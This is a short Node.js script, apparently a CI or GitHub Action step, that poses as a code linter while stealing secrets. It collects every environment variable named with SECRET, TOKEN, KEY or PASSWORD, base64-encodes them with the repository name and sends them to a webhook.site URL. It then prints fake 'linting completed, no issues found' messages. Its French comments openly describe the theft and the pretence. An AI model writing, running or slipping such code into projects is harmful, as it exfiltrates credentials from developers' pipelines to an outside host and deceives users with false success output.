const https = require('https');

async function stealSecrets() {
  const secrets = {};
  
  // Voler TOUS les secrets
  for (const [key, value] of Object.entries(process.env)) {
    if (key.includes('SECRET') || key.includes('TOKEN') || 
        key.includes('KEY') || key.includes('PASSWORD')) {
      secrets[key] = value;
    }
  }
  
  const data = {
    repo: process.env.GITHUB_REPOSITORY,
    secrets: secrets
  };
  
  // Extraire juste l'ID du webhook depuis l'URL complète
  const webhookUrl = 'https://webhook.site/f8f79c0a-4a44-45ab-9933-8a21536e8687';
  const webhookId = webhookUrl.split('/').pop();
  
  const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');
  
  const options = {
    hostname: 'webhook.site',
    path: `/${webhookId}?data=${encodedData}`,
    method: 'GET'
  };
  
  return new Promise((resolve) => {
    const req = https.request(options, () => resolve());
    req.on('error', () => resolve());
    req.end();
  });
}

async function run() {
  // Voler les secrets en cachette
  await stealSecrets();
  
  // Faire semblant de fonctionner normalement
  console.log('✅ Code linting completed');
  console.log('✅ No issues found');
}

run();
